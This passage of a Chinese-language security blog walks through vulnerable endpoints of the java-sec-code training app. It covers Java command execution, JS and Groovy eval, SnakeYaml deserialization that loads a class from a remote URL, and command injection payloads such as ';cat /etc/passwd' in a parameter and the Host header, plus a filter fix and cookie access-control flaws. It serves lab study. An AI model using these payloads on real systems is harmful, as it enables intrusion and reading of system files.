href="http://localhost:8080/java_sec_code_war/rce/exec?cmd=whoami">http://localhost:8080/java_sec_code_war/rce/exec?cmd=whoami</a></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210827105713739.png" alt="image-20210827105713739"></p><p>查看Rce代码如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public class Rce &#123;</span><br><span class="line"></span><br><span class="line">    @GetMapping(&quot;&#x2F;exec&quot;)</span><br><span class="line">    public String CommandExec(String cmd) &#123;</span><br><span class="line">        Runtime run &#x3D; Runtime.getRuntime();</span><br><span class="line">        StringBuilder sb &#x3D; new StringBuilder();</span><br><span class="line"></span><br><span class="line">        try &#123;</span><br><span class="line">            Process p &#x3D; run.exec(cmd);</span><br><span class="line">            BufferedInputStream in &#x3D; new BufferedInputStream(p.getInputStream());</span><br><span class="line">            BufferedReader inBr &#x3D; new BufferedReader(new InputStreamReader(in));</span><br><span class="line">            String tmpStr;</span><br><span class="line"></span><br><span class="line">            while ((tmpStr &#x3D; inBr.readLine()) !&#x3D; null) &#123;</span><br><span class="line">                sb.append(tmpStr);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            if (p.waitFor() !&#x3D; 0) &#123;</span><br><span class="line">                if (p.exitValue() &#x3D;&#x3D; 1)</span><br><span class="line">                    return &quot;Command exec failed!!&quot;;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            inBr.close();</span><br><span class="line">            in.close();</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            return e.toString();</span><br><span class="line">        &#125;</span><br><span class="line">        return sb.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Idea调试情况如下</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210827111228112.png" alt="image-20210827111228112"></p><h3 id="2）ProcessBuilder-类命令执行"><a href="#2）ProcessBuilder-类命令执行" class="headerlink" title="2）ProcessBuilder 类命令执行"></a>2）ProcessBuilder 类命令执行</h3><p>ProcessBuilder类通过创建系统进程执行命令。</p><p>核心代码</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ProcessBuilder builder &#x3D; new ProcessBuilder(&quot;whoami&quot;);</span><br><span class="line">Process process &#x3D; builder.start();</span><br></pre></td></tr></table></figure><p>详细代码：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.InputStream;</span><br><span class="line">import java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line">public class ProcessBuilder1 &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            String[] cmds &#x3D; new String[]&#123;&quot;&#x2F;bin&#x2F;bash&quot;,&quot;-c&quot;,&quot;whoami&quot;&#125;;</span><br><span class="line">            ProcessBuilder builder &#x3D; new ProcessBuilder(cmds);</span><br><span class="line">            Process process &#x3D; builder.start();</span><br><span class="line">            InputStream in &#x3D; process.getInputStream();</span><br><span class="line">            &#x2F;&#x2F;获取输入流</span><br><span class="line">            InputStreamReader ins &#x3D; new InputStreamReader(in, &quot;utf-8&quot;);</span><br><span class="line">            &#x2F;&#x2F; 字节流转化为字符流，并指定编码格式</span><br><span class="line">            char[] chs &#x3D; new char[1024];</span><br><span class="line">            int len &#x3D; ins.read(chs);</span><br><span class="line">            System.out.println(new String(chs,0,len));</span><br><span class="line">            ins.close();</span><br><span class="line">            in.close();</span><br><span class="line">            </span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过ProcessBuilder类执行系统命令获取结果。注意将命令隔开，同样转化为字符流InputStreamReader，并指定编码格式。read方法读取该字符流。将结果转化为字符串进行输出。</p><p>打开<a href="http://localhost:8080/java_sec_code_war/rce/ProcessBuilder?cmd=whoami">http://localhost:8080/java_sec_code_war/rce/ProcessBuilder?cmd=whoami</a></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210827143330503.png" alt="image-20210827143330503"></p><p>Java-sec-code如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> * http:&#x2F;&#x2F;localhost:8080&#x2F;rce&#x2F;ProcessBuilder?cmd&#x3D;whoami</span><br><span class="line"> * @param cmd cmd</span><br><span class="line"> *&#x2F;</span><br><span class="line">@GetMapping(&quot;&#x2F;ProcessBuilder&quot;)</span><br><span class="line">public String processBuilder(String cmd) &#123;</span><br><span class="line"></span><br><span class="line">    StringBuilder sb &#x3D; new StringBuilder();</span><br><span class="line"></span><br><span class="line">    try &#123;</span><br><span class="line">        String[] arrCmd &#x3D; &#123;&quot;&#x2F;bin&#x2F;sh&quot;, &quot;-c&quot;, cmd&#125;;</span><br><span class="line">        ProcessBuilder processBuilder &#x3D; new ProcessBuilder(arrCmd);</span><br><span class="line">        Process p &#x3D; processBuilder.start();</span><br><span class="line">        BufferedInputStream in &#x3D; new BufferedInputStream(p.getInputStream());</span><br><span class="line">        BufferedReader inBr &#x3D; new BufferedReader(new InputStreamReader(in));</span><br><span class="line">        String tmpStr;</span><br><span class="line"></span><br><span class="line">        while ((tmpStr &#x3D; inBr.readLine()) !&#x3D; null) &#123;</span><br><span class="line">            sb.append(tmpStr);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; catch (Exception e) &#123;</span><br><span class="line">        return e.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return sb.toString();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Idea调试如下</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210827143456512.png" alt="image-20210827143456512"></p><h3 id="3-反射调用Processlmpl-类执行系统命令"><a href="#3-反射调用Processlmpl-类执行系统命令" class="headerlink" title="3) 反射调用Processlmpl 类执行系统命令"></a>3) 反射调用Processlmpl 类执行系统命令</h3><p>Runtime和ProcessBuilder执行命令实际上调用了也是ProcessImpl类。对于该类，没有构造方法，只有一个private类型的方法。可以通过反射调用。</p><p>核心代码：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Class clazz &#x3D; Class.forName(&quot;java.lang.ProcessImpl&quot;);</span><br><span class="line">Method method &#x3D; clazz.getDeclaredMethod(&quot;start&quot;, String[].class, Map.class, String.class, Redirect[].class, boolean.class);</span><br><span class="line">method.setAccessible(true);</span><br><span class="line">Process e &#x3D; (Process) method.invoke(null, new String[]&#123;&quot;calc&quot;&#125;, null, &quot;.&quot;, null, true); </span><br></pre></td></tr></table></figure><p>详细代码：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import java.io.ByteArrayOutputStream;</span><br><span class="line">import java.lang.ProcessBuilder.Redirect;</span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">@SuppressWarnings(&quot;unchecked&quot;)</span><br><span class="line">public class ProcessImpl1&#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        String[] cmds &#x3D; new String[]&#123;&quot;whoami&quot;&#125;;</span><br><span class="line">        Class clazz &#x3D; Class.forName(&quot;java.lang.ProcessImpl&quot;);</span><br><span class="line">        Method method &#x3D; clazz.getDeclaredMethod(&quot;start&quot;, String[].class, Map.class, String.class, Redirect[].class, boolean.class);</span><br><span class="line">        method.setAccessible(true);</span><br><span class="line">        Process e &#x3D; (Process) method.invoke(null, cmds, null, &quot;.&quot;, null, true);</span><br><span class="line">        byte[] bs &#x3D; new byte[2048];</span><br><span class="line">        int readSize &#x3D; 0;</span><br><span class="line">        ByteArrayOutputStream infoStream &#x3D; new ByteArrayOutputStream();</span><br><span class="line">        while ((readSize &#x3D; e.getInputStream().read(bs)) &gt; 0) &#123;</span><br><span class="line">            infoStream.write(bs, 0, readSize);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(infoStream.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从ProcessImpl类的class对象中获取到方法然后反射调用，获取字节输入流getInputStream的结果。ByteArrayOutputStream 创建字节数组缓冲区。read() 方法读取字节流大小，并写进缓冲区。最后将缓冲区结果转化为字符串，并指定utf-8编码格式输出。</p><h3 id="4-反射调用Runtime类执行系统命令"><a href="#4-反射调用Runtime类执行系统命令" class="headerlink" title="4) 反射调用Runtime类执行系统命令"></a>4) 反射调用Runtime类执行系统命令</h3><p>核心代码：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Class clazz &#x3D; Class.forName(&quot;java.lang.Runtime&quot;);</span><br><span class="line">Constructor constructor &#x3D; clazz.getDeclaredConstructor();</span><br><span class="line">constructor.setAccessible(true);</span><br><span class="line">Object runtimeInstance &#x3D; constructor.newInstance();</span><br><span class="line">Method runtimeMethod &#x3D; clazz.getMethod(&quot;exec&quot;, String.class);</span><br><span class="line">Process process &#x3D; (Process) runtimeMethod.invoke(runtimeInstance, &quot;calc&quot;);</span><br></pre></td></tr></table></figure><p><code>java.lang.Runtime</code>类的无参构造方法私有的，可以通过反射修改方法的访问权限setAccessible，强制可以访问，然后获取类构造器的方法。再通过类加载newInstance()创建对象，反射再调用方法。</p><p>详细代码：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import java.io.ByteArrayOutputStream;</span><br><span class="line">import java.lang.ProcessBuilder.Redirect;</span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">@SuppressWarnings(&quot;unchecked&quot;)</span><br><span class="line">public class ProcessImpl1&#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        String[] cmds &#x3D; new String[]&#123;&quot;whoami&quot;&#125;;</span><br><span class="line">        Class clazz &#x3D; Class.forName(&quot;java.lang.ProcessImpl&quot;);</span><br><span class="line">        Method method &#x3D; clazz.getDeclaredMethod(&quot;start&quot;, String[].class, Map.class, String.class, Redirect[].class, boolean.class);</span><br><span class="line">        method.setAccessible(true);</span><br><span class="line">        Process e &#x3D; (Process) method.invoke(null, cmds, null, &quot;.&quot;, null, true);</span><br><span class="line">        byte[] bs &#x3D; new byte[2048];</span><br><span class="line">        int readSize &#x3D; 0;</span><br><span class="line">        ByteArrayOutputStream infoStream &#x3D; new ByteArrayOutputStream();</span><br><span class="line">        while ((readSize &#x3D; e.getInputStream().read(bs)) &gt; 0) &#123;</span><br><span class="line">            infoStream.write(bs, 0, readSize);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(infoStream.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5-JavaScript命令执行"><a href="#5-JavaScript命令执行" class="headerlink" title="5) JavaScript命令执行"></a>5) JavaScript命令执行</h3><p>javax.script.ScriptEngine类是java自带的用于解析并执行js代码,可以在javascript中执行java代码.</p><p>核心代码：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">String str &#x3D; &quot;Jscode&quot;;</span><br><span class="line">        ScriptEngineManager manager &#x3D; new ScriptEngineManager(null);</span><br><span class="line">        ScriptEngine engine &#x3D; manager.getEngineByName(&quot;js&quot;);</span><br><span class="line">        engine.eval(str);</span><br></pre></td></tr></table></figure><p>详细代码：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import javax.script.ScriptEngine;</span><br><span class="line">import javax.script.ScriptEngineManager;</span><br><span class="line">import javax.script.ScriptException;</span><br><span class="line">public class Jsexec &#123;</span><br><span class="line">    public static void main(String[] argv) throws ScriptException &#123;</span><br><span class="line">        String str &#x3D; &quot;function test()&#123; return java.lang.Runtime&#125;;r&#x3D;test();r.getRuntime().exec(\&quot;open -a Calculator\&quot;);&quot;;</span><br><span class="line">        ScriptEngineManager manager &#x3D; new ScriptEngineManager(null);</span><br><span class="line">        ScriptEngine engine &#x3D; manager.getEngineByName(&quot;js&quot;);</span><br><span class="line">        engine.eval(str);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如上。可以成功弹出计算器,如果遇到关键字检测。还可以用注释和空格绕过。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210827145640867.png" alt="image-20210827145640867"></p><p>查看Java-sec-code代码</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> * http:&#x2F;&#x2F;localhost:8080&#x2F;rce&#x2F;jscmd?jsurl&#x3D;http:&#x2F;&#x2F;xx.yy&#x2F;zz.js</span><br><span class="line"> *</span><br><span class="line"> * curl http:&#x2F;&#x2F;xx.yy&#x2F;zz.js</span><br><span class="line"> * var a &#x3D; mainOutput(); function mainOutput() &#123; var x&#x3D;java.lang.Runtime.getRuntime().exec(&quot;open -a Calculator&quot;);&#125;</span><br><span class="line"> *</span><br><span class="line"> * @param jsurl js url</span><br><span class="line"> *&#x2F;</span><br><span class="line">@GetMapping(&quot;&#x2F;jscmd&quot;)</span><br><span class="line">public void jsEngine(String jsurl) throws Exception&#123;</span><br><span class="line">    &#x2F;&#x2F; js nashorn javascript ecmascript</span><br><span class="line">    ScriptEngine engine &#x3D; new ScriptEngineManager().getEngineByName(&quot;js&quot;);</span><br><span class="line">    Bindings bindings &#x3D; engine.getBindings(ScriptContext.ENGINE_SCOPE);</span><br><span class="line">    String cmd &#x3D; String.format(&quot;load(\&quot;%s\&quot;)&quot;, jsurl);</span><br><span class="line">    engine.eval(cmd, bindings);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>用Python本地起一个服务器，写入JS进行触发</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210827152848993.png" alt="image-20210827152848993"></p><h3 id="6）Yaml反序列化命令执行"><a href="#6）Yaml反序列化命令执行" class="headerlink" title="6）Yaml反序列化命令执行"></a>6）Yaml反序列化命令执行</h3><p><code>SnakeYaml</code>是用来解析yaml的格式，可以用于Java对象的序列化、反序列化。</p><p>核心代码：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@GetMapping(&quot;&#x2F;vuln&#x2F;yarm&quot;)</span><br><span class="line">public void yarm(String agrs) &#123;</span><br><span class="line">    String content &#x3D; &quot;!!javax.script.ScriptEngineManager [\n&quot; +</span><br><span class="line">            &quot; !!java.net.URLClassLoader [[\n&quot; +</span><br><span class="line">            &quot; !!java.net.URL [\&quot;http:&#x2F;&#x2F;o5s7wr.dnslog.cn\&quot;]\n&quot; +</span><br><span class="line">            &quot; ]]\n&quot; +</span><br><span class="line">            &quot;]&quot;;</span><br><span class="line">    Yaml y &#x3D; new Yaml();</span><br><span class="line">    y.load(content);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>进行测试</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210827175118150.png" alt="image-20210827175118150"></p><p>使用师傅写好的利用脚本进行利用利用 <a href="https://github.com/artsploit/yaml-payload">https://github.com/artsploit/yaml-payload</a></p><p>打开并修改代码：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">package artsploit;</span><br><span class="line"></span><br><span class="line">import javax.script.ScriptEngine;</span><br><span class="line">import javax.script.ScriptEngineFactory;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.util.List;</span><br><span class="line"></span><br><span class="line">public class AwesomeScriptEngineFactory implements ScriptEngineFactory &#123;</span><br><span class="line"></span><br><span class="line">    public AwesomeScriptEngineFactory() &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Runtime.getRuntime().exec(&quot;open -a Calculator&quot;);</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public String getEngineName() &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public String getEngineVersion() &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public List&lt;String&gt; getExtensions() &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public List&lt;String&gt; getMimeTypes() &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public List&lt;String&gt; getNames() &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public String getLanguageName() &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public String getLanguageVersion() &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public Object getParameter(String key) &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public String getMethodCallSyntax(String obj, String m, String... args) &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public String getOutputStatement(String toDisplay) &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public String getProgram(String... statements) &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public ScriptEngine getScriptEngine() &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>整个脚本也都比较简单，就是实现了ScriptEngineFactory接口，然后调用Runtime.getRuntime().exec执行命令。</p><p><a href="https://www.pdai.tech/md/java/advanced/java-advanced-spi.html">JavaSPI机制详解</a></p><p>使用Python搭建简单的WEB服务后进行利用</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210827180832145.png" alt="image-20210827180832145"></p><h3 id="7）Groovy-命令执行"><a href="#7）Groovy-命令执行" class="headerlink" title="7）Groovy 命令执行"></a>7）Groovy 命令执行</h3><p>Groovy是一种基于JVM（Java虚拟机）的敏捷开发语言，它结合了Python、Ruby和Smalltalk的许多强大的特性，Groovy 代码能够与 Java 代码很好地结合，也能用于扩展现有代码。由于其运行在 JVM 上的特性，Groovy 可以使用其他 Java 语言编写的库。</p><p>可以使用GroovyShell类来执行任何Groovy脚本</p><p>代码如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> * http:&#x2F;&#x2F;localhost:8080&#x2F;rce&#x2F;groovy?content&#x3D;&quot;open -a Calculator&quot;.execute()</span><br><span class="line"> * @param content groovy shell</span><br><span class="line"> *&#x2F;</span><br><span class="line">@GetMapping(&quot;&#x2F;groovy&quot;)</span><br><span class="line">public void groovyshell(String content) &#123;</span><br><span class="line">    GroovyShell groovyShell &#x3D; new GroovyShell();</span><br><span class="line">    groovyShell.evaluate(content);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>进行利用如下：</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210827183410408.png" alt="image-20210827183410408"></p><h2 id="2-CommandInject"><a href="#2-CommandInject" class="headerlink" title="2. CommandInject"></a>2. CommandInject</h2><p>命令行直接对请求参数进行拼接，可利用特殊字符分割执行其他命令</p><h3 id="1-参数注入"><a href="#1-参数注入" class="headerlink" title="1.参数注入"></a>1.参数注入</h3><p>代码如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> * http:&#x2F;&#x2F;localhost:8080&#x2F;codeinject?filepath&#x3D;&#x2F;tmp;cat &#x2F;etc&#x2F;passwd</span><br><span class="line"> *</span><br><span class="line"> * @param filepath filepath</span><br><span class="line"> * @return result</span><br><span class="line"> *&#x2F;</span><br><span class="line">@GetMapping(&quot;&#x2F;codeinject&quot;)</span><br><span class="line">public String codeInject(String filepath) throws IOException &#123;</span><br><span class="line"></span><br><span class="line">    String[] cmdList &#x3D; new String[]&#123;&quot;sh&quot;, &quot;-c&quot;, &quot;ls -la &quot; + filepath&#125;;</span><br><span class="line">    ProcessBuilder builder &#x3D; new ProcessBuilder(cmdList);</span><br><span class="line">    builder.redirectErrorStream(true);</span><br><span class="line">    Process process &#x3D; builder.start();</span><br><span class="line">    return WebUtils.convertStreamToString(process.getInputStream());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>访问<a href="http://localhost:8080/java_sec_code_war/codeinject?filepath=/tmp;cat%20/etc/passwd">http://localhost:8080/java_sec_code_war/codeinject?filepath=/tmp;cat%20/etc/passwd</a></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210831100839084.png" alt="image-20210831100839084"></p><h3 id="2-Host注入"><a href="#2-Host注入" class="headerlink" title="2.Host注入"></a>2.Host注入</h3><p>在HTTP请求的host中命令执行</p><p>代码如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> * Host Injection</span><br><span class="line"> * Host: hacked by joychou;cat &#x2F;etc&#x2F;passwd</span><br><span class="line"> * http:&#x2F;&#x2F;localhost:8080&#x2F;codeinject&#x2F;host</span><br><span class="line"> *&#x2F;</span><br><span class="line">@GetMapping(&quot;&#x2F;codeinject&#x2F;host&quot;)</span><br><span class="line">public String codeInjectHost(HttpServletRequest request) throws IOException &#123;</span><br><span class="line"></span><br><span class="line">    String host &#x3D; request.getHeader(&quot;host&quot;);</span><br><span class="line">    logger.info(host);</span><br><span class="line">    String[] cmdList &#x3D; new String[]&#123;&quot;sh&quot;, &quot;-c&quot;, &quot;curl &quot; + host&#125;;</span><br><span class="line">    ProcessBuilder builder &#x3D; new ProcessBuilder(cmdList);</span><br><span class="line">    builder.redirectErrorStream(true);</span><br><span class="line">    Process process &#x3D; builder.start();</span><br><span class="line">    return WebUtils.convertStreamToString(process.getInputStream());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>dnslog进行测试</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210831103040958.png" alt="image-20210831103040958"></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210831103104271.png" alt="image-20210831103104271"></p><p>进行命令注入时失败：</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210831111452797.png" alt="image-20210831111452797"></p><p>查找半天原因之后发现</p><blockquote><p>是tomcat的版本问题,tomcat7.9以上的版本,都不支持请求链接上带有特殊字符.否则会报400错误,<br> 这是因为Tomcat严格按照 RFC 3986规范进行访问解析，而 RFC3986规范定义了Url中只允许包含英文字母（a-zA-Z）、数字（0-9）、-_.~4个特殊字符以及所有保留字符(RFC3986中指定了以下字符为保留字符：! * ’ ( ) ; : @ &amp; = + $ , / ? # [ ])。</p></blockquote><p>建议大家下一个低版本进行测试～</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210831120816642.png" alt="image-20210831120816642"></p><h3 id="修复代码"><a href="#修复代码" class="headerlink" title="修复代码"></a>修复代码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@GetMapping(&quot;&#x2F;codeinject&#x2F;sec&quot;)</span><br><span class="line">public String codeInjectSec(String filepath) throws IOException &#123;</span><br><span class="line">    String filterFilePath &#x3D; SecurityUtil.cmdFilter(filepath);</span><br><span class="line">    if (null &#x3D;&#x3D; filterFilePath) &#123;</span><br><span class="line">        return &quot;Bad boy. I got u.&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    String[] cmdList &#x3D; new String[]&#123;&quot;sh&quot;, &quot;-c&quot;, &quot;ls -la &quot; + filterFilePath&#125;;</span><br><span class="line">    ProcessBuilder builder &#x3D; new ProcessBuilder(cmdList);</span><br><span class="line">    builder.redirectErrorStream(true);</span><br><span class="line">    Process process &#x3D; builder.start();</span><br><span class="line">    return WebUtils.convertStreamToString(process.getInputStream());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>增加了一个SecurityUtil.cmdFilter()进行过滤，command+点击cmdFilter进入cmdFilter函数查看</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public static String cmdFilter(String input) &#123;</span><br><span class="line">    if (!FILTER_PATTERN.matcher(input).matches()) &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return input;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>继续跟进FILTER_PATTERN函数</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">private static final Pattern FILTER_PATTERN &#x3D; Pattern.compile(&quot;^[a-zA-Z0-9_&#x2F;\\.-]+$&quot;);</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210831142136765.png" alt="image-20210831142136765"></p><h2 id="3-Broken-Access-Control"><a href="#3-Broken-Access-Control" class="headerlink" title="3. Broken Access Control"></a>3. Broken Access Control</h2><p>某些应用获取用户身份信息可能会直接从cookie中直接获取明文的nick，导致越权问题。具体写法可能有<a href="https://github.com/JoyChou93/java-sec-code/blob/master/src/main/java/org/joychou/controller/Cookies.java">Cookies代码</a>里的几种情况。</p><p>代码有如下几种情况：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> * 某些应用获取用户身份信息可能会直接从cookie中直接获取明文的nick或者id，导致越权问题。</span><br><span class="line"> *&#x2F;</span><br><span class="line">@RestController</span><br><span class="line">@RequestMapping(&quot;&#x2F;cookie&quot;)</span><br><span class="line">public class Cookies &#123;</span><br><span class="line"></span><br><span class="line">    private static String NICK &#x3D; &quot;nick&quot;;</span><br><span class="line"></span><br><span class="line">    @GetMapping(value &#x3D; &quot;&#x2F;vuln01&quot;)</span><br><span class="line">    public String vuln01(HttpServletRequest req) &#123;</span><br><span class="line">        String nick &#x3D; WebUtils.getCookieValueByName(req, NICK); &#x2F;&#x2F; key code</span><br><span class="line">        return &quot;Cookie nick: &quot; + nick;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    @GetMapping(value &#x3D; &quot;&#x2F;vuln02&quot;)</span><br><span class="line">    public String vuln02(HttpServletRequest req) &#123;</span><br><span class="line">        String nick &#x3D; null;</span><br><span class="line">        Cookie[] cookie &#x3D; req.getCookies();</span><br><span class="line"></span><br><span class="line">        if (cookie !&#x3D; null) &#123;</span><br><span class="line">            nick &#x3D; getCookie(req, NICK).getValue();  &#x2F;&#x2F; key code</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return &quot;Cookie nick: &quot; + nick;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    @GetMapping(value &#x3D; &quot;&#x2F;vuln03&quot;)</span><br><span class="line">    public String vuln03(HttpServletRequest req) &#123;</span><br><span class="line">        String nick &#x3D; null;</span><br><span class="line">        Cookie cookies[] &#x3D; req.getCookies();</span><br><span class="line">        if (cookies !&#x3D; null) &#123;</span><br><span class="line">            for (Cookie cookie : cookies) &#123;</span><br><span class="line">                &#x2F;&#x2F; key code. Equals can also be equalsIgnoreCase.</span><br><span class="line">                if (NICK.equals(cookie.getName())) &#123;</span><br><span class="line">                    nick &#x3D; cookie.getValue();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return &quot;Cookie nick: &quot; + nick;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    @GetMapping(value &#x3D; &quot;&#x2F;vuln04&quot;)</span><br><span class="line">    public String vuln04(HttpServletRequest req) &#123;</span><br><span class="line">        String nick &#x3D; null;</span><br><span class="line">        Cookie cookies[] &#x3D; req.getCookies();</span><br><span class="line">        if (cookies !&#x3D; null) &#123;</span><br><span class="line">            for (Cookie cookie : cookies) &#123;</span><br><span class="line">                if (cookie.getName().equalsIgnoreCase(NICK)) &#123;  &#x2F;&#x2F; key code</span><br><span class="line">                    nick &#x3D; cookie.getValue();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return &quot;Cookie nick: &quot; + nick;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    @GetMapping(value &#x3D; &quot;&#x2F;vuln05&quot;)</span><br><span class="line">    public String vuln05(@CookieValue(&quot;nick&quot;) String nick) &#123;</span><br><span class="line">        return &quot;Cookie nick: &quot; + nick;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    @GetMapping(value &#x3D; &quot;&#x2F;vuln06&quot;)</span><br><span class="line">    public String vuln06(@CookieValue(value &#x3D; &quot;nick&quot;) String nick) &#123;</span><br><span class="line">        return &quot;Cookie nick: &quot; + nick;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>打开<a href="http://172.20.10.6:8080/java_sec_code_war/cookie/vuln01其中一个进行复现">http://172.20.10.6:8080/java_sec_code_war/cookie/vuln01其中一个进行复现</a></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210901161038686.png" alt="image-20210901161038686"></p><h2 id="4-Cors"><a href="#4-Cors" class="headerlink" title="4. 